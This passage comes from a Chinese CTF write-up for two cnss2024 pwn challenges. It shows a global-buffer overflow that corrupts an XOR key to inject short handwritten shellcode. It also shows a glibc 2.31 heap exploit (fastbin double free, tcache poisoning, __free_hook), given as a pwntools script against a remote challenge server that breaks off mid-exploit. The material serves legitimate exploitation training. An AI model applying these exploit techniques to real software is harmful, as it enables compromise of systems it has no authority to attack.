你可能发现，一条指令正确识别了，别的又错了，这很正常。重复上述操作，需要注意，有时候不需要手动汇编匹配右键就有<code class="language-plaintext highlighter-rouge">Code</code>按，也就是说，不用一条指令一条指令地去匹配。<br/>    弄完了之后记得和动态调试的结果对比一下。<br/></h5> <h5 id="可能是由于我ida的问题无法按照wiki上的方法反编译只能根据shino的提示先跳过这一段">   可能是由于我IDA的问题，无法按照wiki上的方法反编译，只能根据Shino的提示先跳过这一段。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f76752ea2ff.png" alt="Screenshot 2024-09-28 102447.png"/></p> <h5 id="不过这个题做完了之后还是找到了反编译的方法挺玄学仅供参考当确认反汇编无误之后先使用apply-patches-to修改二进制文件退出ida删掉原先的i64或者干脆不打包然后再ida打开修改后的二进制文件就可以反编译了">   不过这个题做完了之后，还是找到了反编译的方法，挺玄学，仅供参考。<br/>   当确认反汇编无误之后，先使用<code class="language-plaintext highlighter-rouge">Apply patches to</code>修改二进制文件，退出IDA，删掉原先的.i64（或者干脆不打包），然后再IDA打开修改后的二进制文件，就可以反编译了😅(<br/></h5> <h5 id="回到正题这个漏洞确实不在加密函数里注意到__isoc99_scanfs-name这个东西可以理解为和getsname一样的东西也就是存在溢出这里的name是一个全局变量">   回到正题，这个漏洞确实不在加密函数里。注意到<code class="language-plaintext highlighter-rouge">__isoc99_scanf("%s", name);</code>，这个东西可以理解为和<code class="language-plaintext highlighter-rouge">gets(name)</code>一样的东西，也就是存在溢出。这里的<code class="language-plaintext highlighter-rouge">name</code>是一个全局变量。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">0000000000404070</span>                 <span class="n">public</span> <span class="n">name</span>
<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">0000000000404070</span> <span class="n">name</span>            <span class="n">db</span> <span class="err">'</span><span class="n">DefaultUserName</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>  <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">main</span><span class="o">+</span><span class="mi">93</span><span class="err">↑</span><span class="n">o</span>
<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">00000000004040</span><span class="mi">80</span>                 <span class="n">public</span> <span class="n">key</span>
<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">00000000004040</span><span class="mi">80</span> <span class="n">key</span>             <span class="n">db</span> <span class="err">'</span><span class="n">Pwn5Shino</span><span class="o">!</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>       <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">main</span><span class="o">+</span><span class="mi">14</span><span class="n">C</span><span class="err">↑</span><span class="n">o</span>
<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">00000000004040</span><span class="mi">80</span> <span class="n">_data</span>           <span class="n">ends</span>
<span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="mo">00000000004040</span><span class="mi">80</span>
</code></pre></div></div> <h5 id="name正好在密钥的上面也就是说可以通过溢出修改密钥然后思考修改密钥有什么用之前说到密钥与密文对应异或就可以得到原文然后程序执行这一段的原文所以说控制了密钥就控制了解密出来的指令然后执行我们控制的指令那么这就好办了由数学可知使用密文去异或我们想要的指令即可得到篡改后的密钥下面是一个demo注意返回的是字符串不是bytes">   <code class="language-plaintext highlighter-rouge">name</code>正好在密钥的上面，也就是说可以通过溢出修改密钥。<br/>   然后思考修改密钥有什么用，之前说到，密钥与密文对应异或，就可以得到原文，然后程序执行这一段的原文。所以说控制了密钥，就控制了解密出来的指令，然后执行我们控制的指令。<br/>   那么这就好办了，由数学可知，使用密文去异或我们想要的指令，即可得到篡改后的密钥，下面是一个demo，注意返回的是字符串不是bytes<br/></h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">genkey</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="n">crypto</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="sh">''</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">temp</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">sh</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">crypto</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">key</span> <span class="o">+=</span> <span class="n">temp</span>
    <span class="k">return</span> <span class="n">key</span>
<span class="c1"># 原文里的前十位
</span><span class="n">crypto10</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xa3\x78\x70\xcf\x06\x20\xe0\x8b\x3c\x69</span><span class="sh">'</span>
</code></pre></div></div> <h5 id="想法美好但现实残酷由于本来的密钥只有10位原文索引模10后查表异或所以无论密钥如何篡改可以自由支配的指令最多只有10位-显然10位的shellcode不足以getshell所以根据经验想办法用这10字节弄一个read的系统调用然而调用一次read至少需要12字节如果想要更多的读入指令长度也会增长">   想法美好，但现实残酷，由于本来的密钥只有10位，原文索引模10后查表异或，所以无论密钥如何篡改，可以自由支配的指令最多只有10位。<br/>    显然10位的shellcode不足以<code class="language-plaintext highlighter-rouge">getshell()</code>，所以根据经验想办法用这10字节弄一个<code class="language-plaintext highlighter-rouge">read</code>的系统调用，然而调用一次<code class="language-plaintext highlighter-rouge">read</code>至少需要12字节，如果想要更多的读入，指令长度也会增长。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">)))</span>
<span class="mi">12</span>
</code></pre></div></div> <h5 id="所以这个shellcode还是得手写手写shellcode主要关注的是raxrdirsirdx这四个寄存器分别是系统调用号文件流读入的地址和读入字符数量">   所以这个shellcode还是得手写。手写shellcode主要关注的是<code class="language-plaintext highlighter-rouge">rax</code>、<code class="language-plaintext highlighter-rouge">rdi</code>、<code class="language-plaintext highlighter-rouge">rsi</code>、<code class="language-plaintext highlighter-rouge">rdx</code>，这四个寄存器，分别是系统调用号、文件流、读入的地址和读入字符数量。<br/></h5> <h5 id="断点下载进入函数前0x4015db动态调试一下">   断点下载进入函数前(0x4015db)，动态调试一下，</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> RAX  0
 RBX  0
 RCX  0x7ffff7e97887 <span class="o">(</span>write+23<span class="o">)</span> ◂— cmp rax, <span class="nt">-0x1000</span> /<span class="k">*</span> <span class="s1">'H='</span> <span class="k">*</span>/
 RDX  1
 RDI  0
 RSI  1
 R8   0x467
 R9   0x7ffff7fc9040 <span class="o">(</span>_dl_fini<span class="o">)</span> ◂— endbr64 
 R10  0x7ffff7d8b2e0 ◂— 0xf0022000056ec
 R11  0x246
 R12  0x7fffffffdb18 —▸ 0x7fffffffddd1 ◂— <span class="s1">'/home/pwn/worktable/cnss2024/pwn11'</span>
 R13  0x401458 <span class="o">(</span>main<span class="o">)</span> ◂— endbr64  /<span class="k">*</span> 0xe5894855fa1e0ff3 <span class="k">*</span>/
 R14  0x403e18 <span class="o">(</span>__do_global_dtors_aux_fini_array_entry<span class="o">)</span> —▸ 0x401200 <span class="o">(</span>__do_global_dtors_aux<span class="o">)</span> ◂— endbr64  /<span class="k">*</span> 0x2ebd3d80fa1e0ff3 <span class="k">*</span>/
 R15  0x7ffff7ffd040 <span class="o">(</span>_rtld_global<span class="o">)</span> —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffda00 ◂— 1
 RSP  0x7fffffffd9f0 ◂— 0x20200001000
 RIP  0x4015db <span class="o">(</span>main+387<span class="o">)</span> ◂— call 0x401236 /<span class="k">*</span> 0xb8fffffc56e8 <span class="k">*</span>/
</code></pre></div></div> <h5 id="可以看到rax和rdi恰好都是0read的调用号以及stdin这两个就不用管了主要弄剩下两个">   可以看到，<code class="language-plaintext highlighter-rouge">rax</code>和<code class="language-plaintext highlighter-rouge">rdi</code>恰好都是0（<code class="language-plaintext highlighter-rouge">read</code>的调用号以及<code class="language-plaintext highlighter-rouge">stdin</code>），这两个就不用管了。主要弄剩下两个。<br/></h5> <h5 id="demo1">   demo1</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode1</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    mov rsi, 0x401240 ; 0x401236 + 10
    mov rdx, 0x50
    syscall
</span><span class="sh">'''</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">))</span>
<span class="mi">16</span>
</code></pre></div></div> <h5 id="显然demo1肯定不行了这是因为syscall是固定2字节而mov实际上是一个相当长的指令在构造短shellcode是应尽量避免使用尽量使用pop和push指令尤其在置空寄存器时可以使用xor-rax-rax">   显然demo1肯定不行了，这是因为syscall是固定2字节，而<code class="language-plaintext highlighter-rouge">mov</code>实际上是一个相当长的指令，在构造短shellcode是应尽量避免使用，尽量使用<code class="language-plaintext highlighter-rouge">pop</code>和<code class="language-plaintext highlighter-rouge">push</code>指令，尤其在置空寄存器时，可以使用<code class="language-plaintext highlighter-rouge">xor rax, rax</code></h5> <h5 id="demo2">   demo2</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode2</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    push 0x401240
    pop rsi
    push 0x50
    pop rdx
    syscall
</span><span class="sh">'''</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode2</span><span class="p">))</span>
<span class="mi">11</span>
</code></pre></div></div> <h5 id="玛德正好多一个仔细分析一下rsi要求必须是一定的值所以它的pop和push省不了但rdx不一样只要是一个大数就行注意到此时由于call指令rsp指向的是返回地址0x4015e0已经足够大所以就把它的push给省掉">   玛德正好多一个<br/>   仔细分析一下，<code class="language-plaintext highlighter-rouge">rsi</code>要求必须是一定的值，所以它的<code class="language-plaintext highlighter-rouge">pop</code>和<code class="language-plaintext highlighter-rouge">push</code>省不了，但<code class="language-plaintext highlighter-rouge">rdx</code>不一样，只要是一个大数就行。注意到，此时由于<code class="language-plaintext highlighter-rouge">call</code>指令，<code class="language-plaintext highlighter-rouge">rsp</code>指向的是返回地址（0x4015E0），已经足够大，所以就把它的<code class="language-plaintext highlighter-rouge">push</code>给省掉。</h5> <h5 id="demo3">   demo3</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode3</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    pop rdx
    push 0x401240
    pop rsi
    syscall
</span><span class="sh">'''</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode3</span><span class="p">))</span>
<span class="mi">9</span>
</code></pre></div></div> <h5 id="甚至还少一字节结尾加一个nop占位这样前面算密钥的就不用再改了">   甚至还少一字节😜，结尾加一个<code class="language-plaintext highlighter-rouge">nop</code>占位，这样前面算密钥的就不用再改了。</h5> <h3 id="-ffffree">⚡ FFFFree!</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
魔法铁匠铺的独特笔记
无视空间，使用特殊链表相互连接

据传只需携带扉页
即可全数悉知笔记内容

匠人吟诵咒文，隐藏秘密的页码
后人倾力研究
至暴怒、至癫狂、至忘我、至死亡

还我自由！他们绝望地喊道……

💡 Hint
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Astesia
</code></pre></div></div> <h5 id="介绍一下本题的数据结构本题有关堆的结构是一个链表链表分为控制信息和数据信息首先控制信息有一个固定有一个head-node然后随着链表的添加接着添加其他的node">   介绍一下本题的数据结构。本题有关堆的结构是一个链表，链表分为控制信息和数据信息。首先控制信息有一个固定有一个head node，然后随着链表的添加接着添加其他的node<br/></h5> <h5 id="大概是下面一个结构某个结点free之后idx就会被设置为0x7fffffff表示不可读但本身还留在链表中在show时先从stdin中读取一个idx然后用next依次计数找到链表中第idx个结点puts出text的内容一个这样的控制结点大小固定为0x18也就是一个chunk固定为0x20然后是text指向的数据域也是指定大小范围00x70也就是这个题和unsorted-bin关系不大了">   大概是下面一个结构，某个结点free之后，idx就会被设置为<code class="language-plaintext highlighter-rouge">0x7fffffff</code>表示不可读，但本身还留在链表中；在show时，先从stdin中读取一个idx，然后用<code class="language-plaintext highlighter-rouge">*next</code>依次计数找到链表中第idx个结点，<code class="language-plaintext highlighter-rouge">puts()</code>出<code class="language-plaintext highlighter-rouge">*text</code>的内容。一个这样的控制结点大小固定为<code class="language-plaintext highlighter-rouge">0x18</code>，也就是一个chunk固定为<code class="language-plaintext highlighter-rouge">0x20</code><br/>   然后是<code class="language-plaintext highlighter-rouge">*text</code>指向的数据域，也是指定大小范围<code class="language-plaintext highlighter-rouge">0~0x70</code>，也就是这个题和<code class="language-plaintext highlighter-rouge">unsorted bin</code>关系不大了。<br/>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">node</span><span class="p">{</span>
    <span class="kt">long</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// 有没有符号不太记得了</span>
    <span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
    <span class="n">_BYTE</span> <span class="o">*</span><span class="n">text</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="glibc版本231所以没办法打最原始的tcache-double-free-以及-poisoning因为从ubuntu2004也就是glibc231之前某个版本好像228就有对tcache-double-free的检查针对这个double-free的检查可以通过uaf修改tcache-chunk中的key值或者通过堆溢出改tcache-chunk的大小绕过检查但显然这个题都没有那么还有一种不那么常见的方法虽然glibc231有针对tcache-double-free的检查但是没有对于fastbin的double-free的检查虽然这么说但实际上还是有一些防范措施首先chunk接入fastbin时会检查fastbin栈顶的chunk如果一样就会被检查出来会报fastbin的double-free其次chunk接入fastbin时会在tcache-bin中检查如果发现存在一样则会报tcache-bin的double-free由于此题没用calloc所以malloc时会先从tcache-bin中取出chunk然后把fastbin中的一个chunk挪到tcache-bin中这个挪的过程中不存在double-free的检查所以这个题还是可以打一个tcache-poisoning以及__free_hook首先考虑泄露一下libc这里选择tcache-poisoning以及堆风水技巧将某个控制信息的chunk劫持到free的got表项上然后show出来即可注意到想修改text还需要先覆盖到next为了让链表正确地顺序寻址这个题还需要泄露heap-base">   glibc版本2.31,所以没办法打最原始的<code class="language-plaintext highlighter-rouge">tcache double free</code> 以及 <code class="language-plaintext highlighter-rouge">poisoning</code>，因为从Ubuntu20.04（也就是glibc2.31之前某个版本，好像2.28）就有对<code class="language-plaintext highlighter-rouge">tcache double free</code>的检查。<br/>   针对这个<code class="language-plaintext highlighter-rouge">double free</code>的检查，可以通过UAF修改<code class="language-plaintext highlighter-rouge">tcache chunk</code>中的<code class="language-plaintext highlighter-rouge">key</code>值，或者通过堆溢出改<code class="language-plaintext highlighter-rouge">tcache chunk</code>的大小绕过检查，但显然这个题都没有。<br/>   那么还有一种不那么常见的方法，虽然glibc2.31有针对<code class="language-plaintext highlighter-rouge">tcache double free</code>的检查，但是没有对于<code class="language-plaintext highlighter-rouge">fastbin</code>的<code class="language-plaintext highlighter-rouge">double free</code>的检查。虽然这么说，但实际上还是有一些防范措施。首先<code class="language-plaintext highlighter-rouge">chunk</code>接入<code class="language-plaintext highlighter-rouge">fastbin</code>时会检查<code class="language-plaintext highlighter-rouge">fastbin</code>栈顶的<code class="language-plaintext highlighter-rouge">chunk</code>，如果一样就会被检查出来会报<code class="language-plaintext highlighter-rouge">fastbin的double free</code>；其次，<code class="language-plaintext highlighter-rouge">chunk</code>接入<code class="language-plaintext highlighter-rouge">fastbin时</code>会在<code class="language-plaintext highlighter-rouge">tcache bin</code>中检查，如果发现存在一样则会报<code class="language-plaintext highlighter-rouge">tcache bin的double free</code>。<br/>   由于此题没用<code class="language-plaintext highlighter-rouge">calloc()</code>，所以<code class="language-plaintext highlighter-rouge">malloc()</code>时会先从<code class="language-plaintext highlighter-rouge">tcache bin</code>中取出<code class="language-plaintext highlighter-rouge">chunk</code>，然后把<code class="language-plaintext highlighter-rouge">fastbin</code>中的一个<code class="language-plaintext highlighter-rouge">chunk</code>挪到<code class="language-plaintext highlighter-rouge">tcache bin</code>中，这个挪的过程中不存在<code class="language-plaintext highlighter-rouge">double free</code>的检查，所以这个题还是可以打一个<code class="language-plaintext highlighter-rouge">tcache poisoning</code>以及<code class="language-plaintext highlighter-rouge">__free_hook</code>。<br/>   首先考虑泄露一下libc，这里选择<code class="language-plaintext highlighter-rouge">tcache poisoning</code>以及<code class="language-plaintext highlighter-rouge">堆风水</code>技巧将某个控制信息的chunk劫持到<code class="language-plaintext highlighter-rouge">free()</code>的got表项上，然后show出来即可。<br/>   注意到，想修改<code class="language-plaintext highlighter-rouge">*text</code>，还需要先覆盖到<code class="language-plaintext highlighter-rouge">*next</code>，为了让链表正确地顺序寻址，这个题还需要泄露<code class="language-plaintext highlighter-rouge">heap base</code>。<br/></h5> <h5 id="得到libc基址之后就是愉快地tcache-poisoning以及__free_hook了">   得到libc基址之后，就是愉快地<code class="language-plaintext highlighter-rouge">tcache poisoning</code>以及<code class="language-plaintext highlighter-rouge">__free_hook</code>了。<br/></h5> <h5 id="完整exp">   完整exp</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
    <span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">gdb --pi={}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">pid</span><span class="p">))</span>
    <span class="nf">pause</span><span class="p">()</span>
<span class="n">se</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>           <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>           <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">endstr</span><span class="p">,</span> <span class="n">data</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">endstr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">endstr</span><span class="p">,</span> <span class="n">data</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">endstr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">rc</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>       <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">endstr</span>         <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">endstr</span><span class="p">)</span>
<span class="n">info</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">tag</span><span class="p">,</span> <span class="n">addr</span>         <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="n">tag</span> <span class="o">+</span> <span class="sh">'</span><span class="s">: {:#x}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">))</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="c1"># io = process("./pwn")
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">152.136.11.155</span><span class="sh">"</span><span class="p">,</span><span class="mi">30871</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwn</span><span class="sh">"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc-2.31.so</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0.Exit.</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Size?</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">context</span> <span class="o">!=</span> <span class="sa">b</span><span class="sh">''</span><span class="p">:</span>  
        <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Content?</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span> <span class="c1"># from 1 to ...
</span>    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0.Exit.</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">ord?</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0.Exit.</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">ord?</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 1~9
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
    <span class="nf">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 10
</span><span class="nf">show</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">10:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">rc</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x361</span>
<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">heap_base</span><span class="sh">"</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">)</span>
<span class="n">offset1</span> <span class="o">=</span> <span class="mi">10</span>

<span class="c1"># leak libc
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">d</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 1~11
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">,</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">):</span>
    <span class="nf">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1"># fill tcache
</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">9</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">10</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span> <span class="c1"># fastbin 0x20: 8-&gt;10-&gt;9-&gt;8
</span><span class="nf">free</span><span class="p">(</span><span class="mi">11</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span> <span class="c1"># to deplete tcache
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 12~15 to deplete
</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 17
</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">17</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x6a0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">free</span><span class="sh">'</span><span class="p">]))</span> <span class="c1"># 18
</span><span class="nf">show</span><span class="p">(</span><span class="mi">17</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span>
<span class="nf">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
